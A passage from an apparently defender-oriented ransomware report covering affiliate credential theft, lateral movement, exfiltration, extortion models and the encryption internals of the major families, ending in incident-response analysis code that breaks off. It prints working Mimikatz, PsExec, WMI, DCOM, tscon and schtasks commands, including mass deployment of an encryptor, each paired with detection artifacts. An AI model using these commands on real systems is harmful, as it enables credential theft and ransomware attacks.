SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:05:00
```

The resulting ZIP file is imported into BloodHound's Neo4j database, where Cypher queries identify shortest paths to Domain Admin, Kerberoastable accounts with admin paths, ADCS-abusable templates, and unconstrained delegation hosts.

```
# BloodHound Cypher query: shortest path from owned principal to Domain Admin
MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@TARGET.LOCAL'})) RETURN p

# Find all Kerberoastable users with a path to high-value targets
MATCH (u:User {hasspn:true}), (g:Group {highvalue:true}), p=shortestPath((u)-[*1..]->(g)) RETURN p
```

Artifacts: SharpHound's LDAP collection generates a burst of LDAP queries from a single source IP, querying `objectClass=user`, `objectClass=group`, `objectClass=computer`, `objectClass=trusteddomain`, and SPN attributes in rapid succession. The SAM-R session enumeration (used in `-c Session` and `-c All` modes) triggers Event ID 4624 Type 3 logons to each enumerated host. The `--Stealth` flag reduces this footprint but still produces detectable LDAP query patterns.

#### 3.2.4 Mimikatz Full Command Reference

Mimikatz remains the canonical credential extraction tool despite being heavily signatured. Affiliates execute it reflectively in memory (via Cobalt Strike's `mimikatz` command or `execute-assembly`) or use variants like pypykatz (Python), SafetyKatz (.NET), or BetterSafetyKatz to evade static detection. The following command reference covers techniques observed in ransomware intrusions.

```
# Dump plaintext credentials and NTLM hashes from LSASS memory
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Dump only NTLM hashes from LSASS
mimikatz # sekurlsa::msv

# Dump Kerberos tickets from memory
mimikatz # sekurlsa::tickets /export

# DCSync — replicate credentials for a specific user from a DC
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt

# DCSync — replicate all credentials
mimikatz # lsadump::dcsync /domain:target.local /all /csv

# Dump the SAM database (requires SYSTEM + SAM hive files or live system with SYSTEM privs)
mimikatz # lsadump::sam /system:C:\temp\SYSTEM /sam:C:\temp\SAM

# Extract cached domain credentials (mscash2 format)
mimikatz # lsadump::cache

# Extract DPAPI master keys
mimikatz # sekurlsa::dpapi

# Pass-the-hash — inject NTLM hash into current session
mimikatz # sekurlsa::pth /user:admin /domain:target.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c

# Golden Ticket creation (requires krbtgt NTLM hash)
mimikatz # kerberos::golden /user:fakeadmin /domain:target.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:<ntlm_hash> /ptt

# Silver Ticket creation (requires service account NTLM hash)
mimikatz # kerberos::golden /user:fakeadmin /domain:target.local /sid:S-1-5-21-XXXXXXXXXX /target:fileserver.target.local /service:cifs /rc4:<ntlm_hash> /ptt

# Skeleton Key — patch LSASS to accept a master password for any account
mimikatz # misc::skeleton
# (After this, any account authenticates with password "mimikatz" in addition to the real password)
```

Prerequisites: `privilege::debug` requires `SeDebugPrivilege`, typically held by local administrators. DCSync requires Domain Admin or an account with Replicating Directory Changes + Replicating Directory Changes All rights. Golden Ticket creation requires the `krbtgt` NTLM hash, which is only obtainable via DCSync or NTDS.DIT extraction. The Skeleton Key attack requires code execution on a domain controller with SYSTEM privileges.

Artifacts per technique: `sekurlsa::logonpasswords` triggers Sysmon Event ID 10 (process access) with target `lsass.exe` and access mask `0x1010` or `0x1FFFFF`. DCSync triggers Event ID 4662 with properties containing `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes) and `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All). Golden Ticket usage generates Event ID 4769 where the service name does not match a real account, or Event ID 4624 where the logon account does not exist in the directory. The Skeleton Key attack patches `kdcsvc.dll` in memory on the domain controller, detectable by memory integrity monitoring or by monitoring for LSASS memory writes from non-standard processes.

### 3.3 Lateral Movement

With domain credentials in hand, the affiliate moves laterally to reach high-value targets: domain controllers, file servers, backup infrastructure, and virtualization platforms (VMware vCenter/ESXi).

**SMB + PsExec/WMIC** — The classic approach. PsExec copies a service binary to the target via the `ADMIN$` share, creates and starts a remote service, and executes the payload. WMIC's `process call create` provides similar remote execution without installing a service. Both require administrative credentials on the target. Detection: Event ID 7045 (new service installed) on the target for PsExec; WMI activity logging (Event IDs 5857, 5860, 5861) for WMIC.

**WinRM/PowerShell Remoting** — `Enter-PSSession` or `Invoke-Command` over WinRM (port 5985/5986). Widely enabled in enterprise environments for legitimate administration, making it difficult to distinguish malicious usage. Detection requires PowerShell script block logging (Event ID 4104) and WinRM operational logs.

**RDP pivoting** — Using harvested credentials to RDP from one host to the next. Often chained with port forwarding (via SSH tunnels, Chisel, or Ngrok) to access hosts not directly reachable. RDP leaves extensive artifacts: Event IDs 4624 (Type 10 logon), 1149 (Remote Desktop Services), and the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log.

**Cobalt Strike lateral movement modules** — `jump psexec`, `jump psexec_psh`, `jump winrm`, and `remote-exec` provide automated lateral movement through the Beacon console. These generate the same artifacts as their underlying techniques but may be harder to detect because the payload is executed in memory rather than written to disk.

#### 3.3.1 PsExec Service Creation Mechanism

PsExec (both the Sysinternals original and Impacket's reimplementation) operates by connecting to the target's Service Control Manager (SCM) via the named pipe `\\.\pipe\svcctl` over SMB (TCP 445). The sequence is: (1) authenticate to the target's `ADMIN$` or `C$` share, (2) upload a service executable to `%SystemRoot%\`, (3) connect to the SCM via the `svcctl` named pipe, (4) create a new service pointing to the uploaded binary, (5) start the service, (6) capture output via a named pipe, (7) stop and delete the service after execution. Each step produces artifacts.

```powershell
# Sysinternals PsExec — remote command execution
PsExec.exe \\192.168.1.10 -u target\admin -p P@ssw0rd! -s cmd.exe /c "whoami"

# Deploy and execute a binary on the remote host
PsExec.exe \\192.168.1.10 -u target\admin -p P@ssw0rd! -c C:\tools\payload.exe

# Execute on multiple hosts from a file list
PsExec.exe @targets.txt -u target\admin -p P@ssw0rd! -s -d C:\Windows\Temp\encryptor.exe
```

Artifacts: Event ID 7045 on the target records the new service installation, including the service name (Sysinternals PsExec uses `PSEXESVC` by default; Impacket uses a random 8-character alphanumeric name). The service binary path is recorded in the event. Sysmon Event ID 13 captures the registry modification under `HKLM\SYSTEM\CurrentControlSet\Services\`. Network-level detection can identify the SMB write to the `ADMIN$` share followed by the SCM connection on `\pipe\svcctl`.

#### 3.3.2 WMI Process Creation via DCOM

WMI-based lateral movement uses DCOM (Distributed Component Object Model) to instantiate the `Win32_Process` class on the remote host and call its `Create` method. This executes a process on the target without installing a service, making it quieter than PsExec. The communication occurs over TCP 135 (RPC endpoint mapper) and dynamically assigned high ports for the DCOM object activation.

```powershell
# Command-line WMI execution
wmic /node:192.168.1.10 /user:target\admin /password:P@ssw0rd! process call create "cmd.exe /c whoami > C:\temp\out.txt"

# PowerShell WMI execution (more flexible, supports CIM sessions)
$cred = Get-Credential
Invoke-WmiMethod -ComputerName 192.168.1.10 -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <base64_payload>"

# CIM-based variant (uses WinRM by default, can be forced to DCOM)
$session = New-CimSession -ComputerName 192.168.1.10 -Credential $cred -SessionOption (New-CimSessionOption -Protocol Dcom)
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
```

Artifacts: On the target, the process spawns as a child of `wmiprvse.exe` (WMI Provider Host), visible in Sysmon Event ID 1. WMI Operational logs (Event IDs 5857, 5860, 5861) record the provider loading and the operation. Windows Security Event ID 4688 (process creation) captures the executed command. At the network level, DCOM traffic on TCP 135 followed by RPC on dynamic ports from a workstation to a server is anomalous in most environments.

#### 3.3.3 WinRM and PowerShell Remoting

Windows Remote Management (WinRM) provides native remote PowerShell execution and is enabled by default on Windows Server. Affiliates prefer it because it is a legitimate administrative protocol, uses ports 5985 (HTTP) or 5986 (HTTPS) that are often allowed through internal firewalls, and leaves fewer disk artifacts than PsExec.

```powershell
# Interactive remote PowerShell session
$cred = Get-Credential
Enter-PSSession -ComputerName DC01.target.local -Credential $cred

# Execute a command on multiple remote hosts simultaneously
Invoke-Command -ComputerName Server01,Server02,DC01 -Credential $cred -ScriptBlock {
    Get-Process lsass | Select-Object Id, CPU, WorkingSet
}

# Execute a local script on a remote host
Invoke-Command -ComputerName DC01.target.local -Credential $cred -FilePath C:\tools\recon.ps1

# Persistent session for repeated access (avoids re-authentication overhead)
$s = New-PSSession -ComputerName DC01.target.local -Credential $cred
Invoke-Command -Session $s -ScriptBlock { whoami /all }
Copy-Item -Path C:\tools\payload.exe -Destination C:\temp\ -ToSession $s
```

Artifacts: WinRM sessions generate Event ID 4624 Type 3 on the target. PowerShell script block logging (Event ID 4104) captures the content of executed script blocks. The `Microsoft-Windows-WinRM/Operational` log records session creation and connection events. Sysmon Event ID 1 captures `wsmprovhost.exe` (the WinRM host process) spawning child processes. Event ID 4103 (module logging) provides additional PowerShell command details.

#### 3.3.4 DCOM Lateral Movement Objects

Beyond WMI, several other DCOM objects support remote code execution. These are less commonly detected because they do not use well-known administrative tools and produce atypical process parent-child relationships.

The `MMC20.Application` object exposes an `ExecuteShellCommand` method that runs arbitrary commands on the remote host. The process tree shows `mmc.exe` as the parent of the executed command, which is unusual and detectable.

```powershell
# DCOM lateral movement via MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\cmd.exe",$null,"/c calc.exe","7")
```

The `ShellWindows` and `ShellBrowserWindow` DCOM objects provide similar remote execution capabilities through the `ShellExecute` method. These produce `explorer.exe` as the parent process.

```powershell
# DCOM lateral movement via ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","192.168.1.10"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

Artifacts: All DCOM lateral movement produces network traffic on TCP 135 and dynamic RPC ports. On the target, the parent process depends on the DCOM object used (`mmc.exe` for MMC20, `explorer.exe` for ShellWindows). Sysmon Event ID 1 captures these unusual parent-child relationships. Event ID 4688 with `0x17` (DCOM) as the logon type indicates DCOM-based process creation.

#### 3.3.5 RDP Hijacking via tscon.exe

The `tscon.exe` utility connects a user to an existing Remote Desktop session. When executed as SYSTEM (e.g., from a service or PsExec with `-s`), it can attach the current console session to another user's active RDP session without requiring that user's password. This effectively hijacks active administrator sessions.

```powershell
# List active RDP sessions on the current host
query user

# Hijack session ID 2 (another user's active session) from the console
# This must be executed as SYSTEM — no password required
tscon 2 /dest:console

# From a PsExec SYSTEM shell, redirect the target session to your RDP session
PsExec.exe -s cmd.exe /c "tscon 2 /dest:rdp-tcp#0"

# Alternatively, create a service that runs tscon (to get SYSTEM context)
sc create sesshijack binPath= "cmd.exe /k tscon 2 /dest:console"
net start sesshijack
```

Prerequisites: The attacker must have SYSTEM-level access on the target host. The victim user must have an active (connected or disconnected) RDP session. This technique requires local execution — it is not a remote attack but enables session stealing once the attacker has local admin on a host where a high-value user has an active session.

Artifacts: Event ID 4778 (session reconnected) and 4779 (session disconnected) in the Windows Security log. The `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log records session reconnections. Sysmon Event ID 1 captures `tscon.exe` execution with command-line arguments revealing the target session ID.

#### 3.3.6 SCM-Based Remote Service Creation

Direct service creation via the Service Control Manager is a variant of the PsExec approach but without the PsExec wrapper. The affiliate uses `sc.exe` to remotely create and start a service that executes their payload.

```powershell
# Create a remote service that executes a payload
sc \\192.168.1.10 create malservice binPath= "cmd.exe /c C:\Windows\Temp\payload.exe" start= auto
sc \\192.168.1.10 start malservice

# Cleanup after execution
sc \\192.168.1.10 stop malservice
sc \\192.168.1.10 delete malservice
```

Artifacts: Event ID 7045 (new service) on the target captures the service name and binary path. Event ID 4697 (security log) also records service installation when audit policy is configured. Network-level detection identifies SCM connections via `\pipe\svcctl`.

#### 3.3.7 Remote Scheduled Task Creation

Scheduled tasks provide yet another remote execution mechanism. Unlike services, scheduled tasks can be configured for delayed execution (useful for synchronized ransomware deployment) and can run under different security contexts.

```powershell
# Create a remote scheduled task that runs immediately
schtasks /create /s 192.168.1.10 /u target\admin /p P@ssw0rd! /ru SYSTEM /tn "WindowsUpdate" /tr "C:\Windows\Temp\encryptor.exe" /sc once /st 00:00 /f
schtasks /run /s 192.168.1.10 /u target\admin /p P@ssw0rd! /tn "WindowsUpdate"

# Create a scheduled task across multiple hosts for synchronized deployment
for /f %i in (targets.txt) do schtasks /create /s %i /u target\admin /p P@ssw0rd! /ru SYSTEM /tn "SysUpdate" /tr "C:\Windows\Temp\encryptor.exe" /sc once /st 02:00 /f
```

Artifacts: Event ID 4698 (scheduled task created) in the Security log captures the task name, action, and the user context. Sysmon Event ID 1 captures `schtasks.exe` execution with full command-line arguments. The `Microsoft-Windows-TaskScheduler/Operational` log records task registration and execution events.

#### 3.3.8 SMB Named Pipe Pivoting Through Cobalt Strike

In Cobalt Strike, SMB Beacons communicate through named pipes rather than direct network connections. This allows beacons deep within a network to chain their communications through peer beacons that have direct C2 connectivity, effectively creating a daisy-chain pivot through the network without requiring each compromised host to have outbound internet access.

```
# In the Cobalt Strike console, create an SMB listener
# Listeners > Add > Beacon SMB > Pipename: msagent_89

# Generate an SMB beacon payload
# Attacks > Packages > Windows Executable (S) > Listener: SMB

# From an existing HTTP beacon on a host with C2 connectivity, link to the SMB beacon
beacon> link 192.168.1.20 msagent_89

# The SMB beacon on 192.168.1.20 now communicates through the linking beacon
# Check connection status
beacon> links
```

This pivoting technique is critical in segmented networks where internal servers cannot reach the internet. The only network artifact is SMB traffic (TCP 445) between internal hosts — traffic that is often legitimate and difficult to filter without breaking administrative workflows. Detection must focus on the named pipe itself: Sysmon Event IDs 17 (pipe created) and 18 (pipe connected) capture named pipe operations, and known Cobalt Strike default pipe names (`msagent_*`, `postex_*`, `status_*`, `MSSE-*`) can be signatured, though operators customize these in their profiles.

### 3.4 Privilege Escalation and Domain Dominance

If initial credentials are insufficient for domain-wide deployment, the affiliate escalates. Common paths observed in ransomware incidents:

**Active Directory Certificate Services (ADCS) abuse** — ESC1 through ESC8 attack chains allow a domain user to obtain certificates that grant domain admin privileges. ESC1 (misconfigured certificate template allowing any user to specify a Subject Alternative Name) is the most commonly exploited. The affiliate requests a certificate with the SAN set to a domain admin UPN, then uses the certificate for Kerberos authentication. See Domain 14 Chapter 14A §6 for the full ADCS attack taxonomy.

**GPO abuse** — If the affiliate compromises an account with write permissions to a Group Policy Object linked to the domain, they modify the GPO to deploy their payload (scheduled task, logon script, or software installation) to every machine that applies the GPO. This is a single-action deployment mechanism for ransomware across thousands of hosts.

**Unconstrained delegation abuse** — Hosts configured for unconstrained Kerberos delegation cache the TGTs of any user who authenticates to them. The affiliate compromises such a host, extracts cached TGTs (including domain admin TGTs), and uses them for pass-the-ticket attacks. Coercion attacks (PrinterBug/PetitPotam) can force a domain controller to authenticate to the compromised host, yielding the DC's machine account TGT. See Domain 14 Chapter 14A §4.

---

## 4. Data Exfiltration and Extortion Infrastructure

### 4.1 Pre-Encryption Data Theft

Double extortion—encrypting files and threatening to publish stolen data—is now standard across all major RaaS operations. Data exfiltration typically occurs 1–5 days before encryption deployment, during the "dwell time" when the affiliate has domain dominance but has not yet pulled the trigger.

**Target data identification:** Affiliates target file shares containing financial records, HR data (personally identifiable information), intellectual property, legal documents, and customer databases. They use search tools to locate valuable data: `dir /s /b *.pdf *.docx *.xlsx *.pst *.bak` across network shares, or more sophisticated approaches using `Everything` (the Voidtools search engine) installed on a compromised host to index the entire network's file shares in minutes.

**Staging:** Data is compressed (typically using 7-Zip or WinRAR with split-archive options to create manageable chunks) and staged on a central host before exfiltration. Detection: monitor for large-scale compression operations, particularly `7z.exe a -v500m` commands creating split archives, and for the appearance of large archive files on workstations that do not normally produce them.

**Exfiltration channels:** The dominant exfiltration methods observed in 2023–2025:

Cloud storage services — Mega.nz (via the `MEGAcmd` or `rclone` command-line tools), Dropbox, Google Drive, and Azure Blob Storage. These are preferred because the traffic is encrypted (HTTPS), the domains are trusted and not blocked by web proxies, and the storage capacity is effectively unlimited. Rclone is the single most commonly observed exfiltration tool across all ransomware families. Detection: monitor for rclone process execution, rclone configuration files (`rclone.conf`), and network connections to cloud storage API endpoints (e.g., `g.api.mega.co.nz`, `content.dropboxapi.com`) from hosts that do not normally communicate with these services. DLP solutions that inspect HTTPS traffic (via TLS interception on the web proxy) can detect the volume and pattern of outbound data transfer.

Custom exfiltration tools — Some RaaS operators provide affiliates with dedicated exfiltration tools. BlackCat/ALPHV developed Exmatter, a .NET tool that automatically discovers and exfiltrates high-value file types over SFTP or WebDAV. Black Basta affiliates used a custom tool observed in incident reports that chunked data and uploaded it to attacker-controlled infrastructure over HTTPS.

FTP/SFTP to attacker-controlled servers — Less common in sophisticated operations because FTP traffic is easily detected and blocked, but still observed in lower-sophistication incidents.

**Detection strategy for exfiltration:** The most reliable detection is volumetric: alert on any single host or user account transferring more than a threshold of data (e.g., 5 GB) to an external destination within a 24-hour period, especially outside business hours. This requires network telemetry (NetFlow, proxy logs, or firewall session logs) with sufficient granularity to track per-source transfer volumes. Combine volumetric detection with process-based detection (rclone, MEGAcmd, WinSCP command-line usage) for defense in depth.

### 4.2 The Extortion Model Spectrum

**Single extortion:** Encryption only. The attacker encrypts files and demands payment for the decryption key. This was the original ransomware model and is now rare among sophisticated groups because victims with functional backups can recover without paying.

**Double extortion:** Encryption plus data theft. The attacker encrypts files and threatens to publish stolen data on their data leak site (DLS) if the ransom is not paid. Even organizations with perfect backups face pressure to pay to prevent data disclosure. This is the current standard model.

**Triple extortion:** Double extortion plus additional pressure: DDoS attacks against the victim's public-facing infrastructure, direct contact with the victim's customers or partners to inform them of the breach (creating regulatory and reputational pressure), or threats to report the breach to regulatory authorities (particularly effective in healthcare and financial services contexts where regulatory penalties are severe).

**Extortion-only (no encryption):** Groups like Cl0p, Karakurt, and Lapsus$ have conducted campaigns focused entirely on data theft without deploying encryption. The Cl0p MOVEit campaign (CVE-2023-34362) compromised over 2,600 organizations through a SQL injection in the MOVEit Transfer file sharing application, exfiltrated data from each, and extorted victims purely on the basis of data publication threats. This model is increasingly attractive because it is faster (no need to deploy an encryptor), lower-risk (encryption deployment is the noisiest and most detectable phase), and victims are still highly motivated to pay to prevent data disclosure.

### 4.3 Negotiation Infrastructure

RaaS operators maintain Tor-based negotiation portals where victims communicate with the ransomware team. The victim's ransom note contains a unique identifier (typically a hash or UUID) and a Tor onion address. Upon visiting the portal and entering their identifier, the victim enters a chat interface. Professional RaaS operations staff these portals with negotiators who speak English, provide "proof of decryption" by decrypting a small sample file, and negotiate pricing.

Ransom demands are calibrated to the victim's perceived ability to pay. RaaS operators research victims using publicly available financial data (revenue, employee count, insurance filings). Demands typically range from 1–5% of the victim's annual revenue. Initial demands are often inflated with the expectation of negotiation; final payments are typically 30–50% of the initial demand.

Payment is almost exclusively in Bitcoin, with some groups accepting Monero (at a discount, since Monero's privacy features mean the group does not need to launder the payment). The ransom wallet address is unique per victim to prevent transaction tracking across victims. After payment, the operator provides a decryptor, which is often a simple wrapper around a symmetric decryption function keyed with the victim-specific key retrieved from the operator's key server.

---

## 5. Encryption Internals Across Major Ransomware Families

Understanding how each ransomware family implements encryption is essential for: (a) assessing whether decryption is possible without paying, (b) understanding the performance characteristics that dictate encryption speed and therefore the detection window, and (c) developing file-based detections.

### 5.1 Common Encryption Architecture

Modern ransomware uses a hybrid encryption scheme identical in concept to TLS:

1. The RaaS operator generates an asymmetric key pair (RSA-2048/4096 or Curve25519). The public key is embedded in the encryptor binary or retrieved from the C2 server.
2. For each victim, the encryptor generates a per-session symmetric key (AES-256 or ChaCha20) and optionally a per-file key.
3. Each file is encrypted with the symmetric key. The symmetric key (or a per-file key derivation) is then encrypted with the operator's public key and appended to the encrypted file or stored in a separate metadata file.
4. Only the operator, who holds the private key, can decrypt the symmetric key and thus the files.

This architecture means that without a flaw in the key generation, key storage, or encryption implementation, decryption without the private key is computationally infeasible.

### 5.2 LockBit 3.0 (LockBit Black)

LockBit 3.0 encrypts using AES-256-CTR for file content and RSA-2048 for key wrapping. The builder generates a unique RSA key pair per build; the private key is stored on the RaaS operator's server. The binary is heavily obfuscated: API calls are resolved at runtime via API hashing (a CRC-based hash of the API function name), control flow is flattened, and strings are encrypted.

Performance optimization is a LockBit hallmark. The encryptor uses multi-threaded I/O completion ports (IOCP) on Windows to maximize disk throughput. File encryption uses "intermittent encryption"—only encrypting portions of each file (typically the first 4 KB of every 16 KB block) rather than the entire file. This dramatically increases encryption speed (allowing encryption of hundreds of gigabytes in minutes) at the cost of leaving significant plaintext in each file. This design choice creates a detection opportunity: file integrity monitoring that compares file entropy can detect the intermittent pattern, and for some file formats, partial recovery of data from the unencrypted regions is possible.

LockBit 3.0 includes anti-analysis features: it checks for debuggers, sandboxes, and virtual machine indicators before executing. It clears Windows Event Logs, deletes Volume Shadow Copies (`vssadmin delete shadows /all /quiet`), disables Windows Defender (`Set-MpPreference -DisableRealtimeMonitoring $true`), and terminates processes and services that could lock files (SQL Server, Exchange, backup agents, AV services) using a hardcoded list.

Detection artifacts: LockBit 3.0 creates a mutex with a name derived from the victim's machine GUID. Encrypted files receive a random extension (configurable in the builder). The ransom note file (`<random>.README.txt`) is dropped in every encrypted directory. The wallpaper is changed to display the ransom message. Event log clearing generates Event ID 1102 in the Security log.

### 5.3 BlackCat/ALPHV

BlackCat is written in Rust, providing cross-platform capabilities. The Linux variant targets VMware ESXi environments, encrypting `.vmdk`, `.vmx`, and `.vmsn` files to disable entire virtualization infrastructures. The Windows variant uses AES-128-CTR or ChaCha20 for file encryption and RSA-4096 for key wrapping.

BlackCat's configuration is embedded as a JSON blob within the binary, encrypted with a per-build AES key. The configuration specifies: targeted file extensions, excluded directories and extensions, services and processes to kill, credential harvesting options, network propagation settings, and encryption mode (full, fast/intermittent, or SmartPattern—which encrypts the first N bytes, then every Nth block).

ESXi encryption: the Linux variant uses the `esxcli` command to enumerate and shut down running VMs (`esxcli vm process list` / `esxcli vm process kill --type=hard`), then encrypts the datastore files. This operational pattern—shutting down VMs before encrypting their disk files—is a high-fidelity detection trigger. Monitor ESXi host logs for batch VM shutdown operations that do not correspond to scheduled maintenance windows.

### 5.4 Cl0p

Cl0p is notable more for its operational model than its encryption implementation. The group specializes in identifying and exploiting zero-day vulnerabilities in file transfer appliances (Accellion FTA in 2021, GoAnywhere MFT in 2023, MOVEit Transfer in 2023, Cleo Harmony/VLTrader in 2024) to achieve mass data theft from hundreds of organizations simultaneously. Their encryptor uses AES-256 with RSA-2048 key wrapping but is deployed selectively; many Cl0p campaigns are extortion-only with no encryption.

The MOVEit campaign is instructive for its operational sophistication: Cl0p exploited CVE-2023-34362 (a SQL injection in MOVEit Transfer's web interface) to deploy a web shell (`human2.aspx`) that communicated with the MOVEit database to enumerate the target's organizational structure and identify high-value data before exfiltrating it. The web shell was lightweight and purpose-built: it accepted commands via HTTP headers, accessed the MOVEit Azure Blob Storage or on-premise file system configuration, and streamed data out via the web shell response.

### 5.5 Black Basta

Black Basta, believed to be partially composed of former Conti members, uses ChaCha20 for file encryption and RSA-4096 for key wrapping. It also uses intermittent encryption. A distinguishing characteristic is its aggressive ESXi targeting and its use of the `printf` command on Linux to overwrite the ESXi `/etc/motd` (message of the day) file with the ransom note.

Black Basta's Windows variant disables the Windows Recovery Environment (`bcdedit /set {default} recoveryenabled No`), deletes shadow copies, and modifies the boot configuration to prevent Safe Mode recovery. The encryptor creates a custom desktop wallpaper and changes the default Windows icon for encrypted files to display a skull icon, a distinctive artifact that aids in family identification during incident response.

### 5.6 Akira

Akira emerged in March 2023 and has targeted small and medium enterprises aggressively. The Windows variant uses CryptGenRandom to generate a per-file symmetric key, encrypts file content with ChaCha20, and wraps the symmetric key with RSA-4096. The Linux variant targets VMware ESXi environments.

Akira's initial access patterns heavily favor compromised VPN credentials, particularly for Cisco ASA/AnyConnect and Fortinet FortiClient VPNs where MFA is not enforced. The group has also exploited CVE-2020-3259 (Cisco ASA information disclosure) and CVE-2023-20269 (Cisco ASA/FTD unauthorized access) for initial access. Detection: monitor Cisco ASA/FTD logs for VPN sessions from unrecognized IP addresses, especially sessions initiated via client-based VPN (AnyConnect) rather than clientless SSL VPN.

### 5.7 Rhysida

Rhysida targets healthcare, education, and government organizations. It uses ChaCha20 for file encryption and RSA-4096 for key wrapping. A critical implementation flaw was identified by Korean researchers at KISA in February 2024: Rhysida used the C standard library's `rand()` function seeded with the current system time for generating encryption keys. Because the seed space was only 32 bits (the Unix timestamp at encryption time), and the approximate encryption time could be estimated from file timestamps, the per-file keys could be brute-forced. This flaw was used to build a free decryptor before Rhysida updated their encryptor to use a cryptographically secure random number generator.

This case illustrates why encryption implementation analysis matters: implementation flaws in ransomware cryptography, while increasingly rare in mature families, can enable decryption without payment. No Starch Press published a detailed writeup, and KISA released the decryption tool.

### 5.8 Ransomware Encryption Analysis Techniques

When a ransomware incident occurs and no public decryptor exists, the IR team must assess whether decryption without payment is feasible. This assessment involves identifying the encryption algorithm, searching for key material in memory, parsing encrypted file headers, and evaluating implementation weaknesses. The following techniques and code support that analysis.

#### 5.8.1 Entropy Analysis for Algorithm Identification

Encrypted data has near-maximum Shannon entropy (close to 8.0 bits per byte for random data). Comparing the entropy of original and encrypted files reveals the encryption mode and whether intermittent encryption was used. Intermittent encryption (used by LockBit, Black Basta, and others) creates a distinctive sawtooth entropy pattern where high-entropy encrypted blocks alternate with lower-entropy plaintext blocks.

```python
#!/usr/bin/env python3
"""Identify encryption characteristics from a ransomware-encrypted file.

Calculates per-block entropy to detect intermittent vs full encryption,
identifies crypto constants in memory dumps, and extracts file header metadata.
"""

import math
import struct
import sys
from collections import Counter
from pathlib import Path


def shannon_entropy(data: bytes) -> float:
    """Calculate Shannon entropy of a byte sequence (0.0 to 8.0)."""
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    return -sum(
        (count / length) * math.log2(count / length)
        for count in counts.values()
    )


def analyze_file_entropy(filepath: str, block_size: int = 4096) -> list[dict]:
    """Analyze per-block entropy to detect intermittent encryption patterns."""
    results = []
    data = Path(filepath).read_bytes()
    for offset in range(0, len(data), block_size):
        block = data[offset : offset + block_size]
        ent = shannon_entropy(block)
        results.append({
            "offset": offset,
            "entropy": round(ent, 4),
            "likely_encrypted": ent > 7.5,
        })
    encrypted_blocks = sum(1 for r in results if r["likely_encrypted"])
    total_blocks = len(results)
    ratio = encrypted_blocks / total_blocks if total_blocks else 0
    print(f"[*] Total blocks: {total_blocks}, Encrypted: {encrypted_blocks} ({ratio:.1%})")
    if 0.2 < ratio < 0.8:
        print("[!] Intermittent encryption detected — partial plaintext recovery may be possible")
    elif ratio >= 0.8:
        print("[*] Full encryption — standard hybrid scheme likely")
    else:
        print("[?] Low encryption ratio — possible partial encryption or non-encrypted file")
    return results


# AES S-box (first 16 bytes) — present in any AES implementation
AES_SBOX_MARKER = bytes([
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
])

# ChaCha20 constant "expand 32-byte k"
CHACHA20_CONSTANT = b"expand 32-byte k"

# RSA public key ASN.1 header (DER encoded, RSA 2048)
RSA_2048_HEADER = bytes([0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09])

# Curve25519 basepoint (used in some ransomware key exchange)
CURVE25519_BASEPOINT = bytes([0x09] + [0x00] * 31)


def scan_for_crypto_constants(dump_path: str) -> list[dict]:
    """Scan a memory dump or binary for cryptographic constants."""
    data = Path(dump_path).read_bytes()
    findings = []
    markers = [
        ("AES S-box", AES_SBOX_MARKER),
        ("ChaCha20 constant", CHACHA20_CONSTANT),
        ("RSA-2048 public key header", RSA_2048_HEADER),
        ("Curve25519 basepoint", CURVE25519_BASEPOINT),
    ]
    for name, marker in markers:
        offset = 0
        while True:
            pos = data.find(marker, offset)
            if pos == -1:
                break
            findings.append({"constant": name, "offset": hex(pos)})
            offset = pos + 1
    return findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <encrypted_file_or_memdump> [--entropy|--crypto]")
        sys.exit(1)
    target = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else "--entropy"
    if mode == "--entropy":
        analyze_file_entropy(target)
    elif mode == "--crypto":
        results = scan_for_crypto_constants(target)
        for r in results:
            print(f"  [{r['constant']}] at offset {r['offset']}")
```

#### 5.8.2 Key Extraction from Memory Dumps

When volatile memory is preserved from an actively encrypting host (or one that recently finished encryption), the per-session symmetric key may still be resident. Ransomware processes typically generate the AES or ChaCha20 key early in execution and retain it in heap memory until the process exits. The RSA-encrypted copy of the key is written to each encrypted file, but the plaintext key exists in process memory during the encryption window.

Searching for key material requires knowledge of the expected key size and structure. AES-256 keys are 32 bytes of high-entropy data, often preceded by the AES key schedule (the expanded key schedule is 240 bytes for AES-256). The following approach searches for AES key schedule patterns in a memory dump.

```python
def find_aes256_key_schedules(dump_path: str) -> list[int]:
    """Search for potential AES-256 key schedules in a memory dump.

    An AES-256 key schedule is 240 bytes (15 round keys * 16 bytes).
    The first 32 bytes are the original key. We validate by checking
    that the round key derivation relationship holds for at least
    the first expansion round.
    """
    data = Path(dump_path).read_bytes()
    candidates = []
    # AES-256 Rcon values for first rounds
    rcon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40]
    aes_sbox = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
